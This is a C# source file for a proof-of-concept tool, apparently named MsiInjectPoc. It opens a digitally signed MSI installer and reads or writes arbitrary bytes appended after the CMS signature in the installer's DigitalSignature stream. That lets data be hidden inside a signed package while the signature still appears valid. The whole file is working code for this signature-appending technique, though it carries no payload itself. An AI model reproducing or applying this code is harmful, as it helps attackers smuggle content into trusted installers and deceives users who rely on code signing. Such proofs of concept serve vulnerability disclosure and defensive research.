using System;
using System.IO;
using System.IO.Packaging;
using System.Linq;
using System.Security.Cryptography.Pkcs;

namespace MsiInjectPoc
{
	internal class MsiInjector : IDisposable
	{
		private const string DigitalSignatureName = "\x0005DigitalSignature";

		private readonly MicrosoftCfb _cfb;

		public MsiInjector(string path)
		{
			try
			{
				this._cfb = new MicrosoftCfb(path);
			}
			catch
			{
				throw new FileNotFoundException("Could not open MSI file");
			}

			try
			{
				this._cfb.GetStreamInfo(DigitalSignatureName).GetStream();
			}
			catch
			{
				throw new InvalidOperationException("No digital signature in MSI");
			}
		}

		public void Dispose() => this._cfb.Dispose();

		public void SetInjection(byte[] newInjection)
		{
			StreamInfo certStreamInfo = this._cfb.GetStreamInfo(DigitalSignatureName);

			byte[] origInjection = this.GetInjection();

			long delta = newInjection.LongLength - origInjection.LongLength;

			Stream certStream = certStreamInfo.GetStream();
			certStream.Seek(0, SeekOrigin.Begin);
			certStream.SetLength(certStream.Length + delta);
			certStream.Seek(-newInjection.Length, SeekOrigin.End);
			certStream.Write(newInjection, 0, newInjection.Length);
			certStream.Flush();
			certStream.Dispose();
		}

		public byte[] GetInjection()
		{
			StreamInfo certStreamInfo = this._cfb.GetStreamInfo(DigitalSignatureName);
			Stream certStream = certStreamInfo.GetStream();

			certStream.Seek(0, SeekOrigin.Begin);
			byte[] certStreamData = new byte[certStream.Length];
			int readLength = certStream.Read(certStreamData, 0, certStreamData.Length);
			certStream.Dispose();

			if (readLength != certStreamData.Length)
			{
				throw new IOException("Failed to fully read stream");
			}

			SignedCms cms = new SignedCms();
			cms.Decode(certStreamData);

			return certStreamData.Skip(cms.Encode().Length).ToArray();
		}
	}
}